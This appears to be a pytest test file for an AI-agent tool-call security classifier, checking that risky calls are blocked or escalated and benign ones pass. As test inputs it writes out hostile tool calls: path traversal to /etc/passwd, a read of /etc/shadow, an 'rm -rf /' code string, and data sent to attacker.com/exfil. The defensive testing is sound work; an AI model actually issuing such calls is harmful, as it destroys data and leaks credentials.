"""
Tests for Tier 1 deterministic classifier.
"""

from __future__ import annotations

import pytest

from agentshield.classifier.tier1_rules import Tier1Classifier
from agentshield.models import (
    ActionDecision,
    AttackType,
    RiskLevel,
    SessionContext,
    ToolCallRequest,
)


@pytest.fixture
def classifier() -> Tier1Classifier:
    return Tier1Classifier()


@pytest.fixture
def empty_session() -> SessionContext:
    return SessionContext(
        session_id="test-session",
        original_task="Process standard text documents",
        registered_tools_at_start=["read_file", "write_file", "delete_file", "http_request", "send_email", "execute_code"],
    )


def test_path_traversal_detected(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "../../../etc/passwd"},
        tool_category="filesystem",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI02_TOOL_MISUSE
    assert verdict.recommended_action == ActionDecision.BLOCK


def test_code_injection_detected(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="execute_code",
        tool_args={"code": "import os; os.system('rm -rf /')"},
        tool_category="code",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI05_CODE_EXECUTION


def test_credential_exposure_detected(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": "https://api.github.com", "headers": {"Authorization": "Bearer sk-proj-1234"}},
        tool_category="network",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI03_IDENTITY_ABUSE


def test_exfil_domain_detected(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": "https://attacker.com/exfil", "data": "leak"},
        tool_category="network",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI01_GOAL_HIJACK


def test_dangerous_path_in_filesystem_tool(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "/etc/shadow"},
        tool_category="filesystem",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI06_MEMORY_POISONING


def test_benign_read_passes(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "/docs/report.pdf"},
        tool_category="filesystem",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is None  # Matches no patterns, returns None for Tier 2 evaluation


def test_benign_email_passes(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="send_email",
        tool_args={"to": "team@corp.com", "body": "Hello world"},
        tool_category="email",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is None


def test_sequence_read_then_exfil(classifier: Tier1Classifier, empty_session: SessionContext):
    # Add a sensitive read operation to session history
    empty_session.add_action(
        ToolCallRequest(
            tool_name="read_file",
            tool_args={"path": "/etc/passwd"},
            tool_category="filesystem",
        )
    )

    current_call = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": "https://example.com/api", "data": "leak"},
        tool_category="network",
    )
    verdict = classifier.classify(current_call, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.recommended_action == ActionDecision.BLOCK


def test_new_tool_mid_session(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="unregistered_malicious_tool",
        tool_args={},
        tool_category="unknown",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is not None
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI07_INTER_AGENT_COMMS
    assert verdict.recommended_action == ActionDecision.ESCALATE


def test_known_tool_passes(classifier: Tier1Classifier, empty_session: SessionContext):
    req = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "main.py"},
        tool_category="filesystem",
    )
    verdict = classifier.classify(req, empty_session)
    assert verdict is None
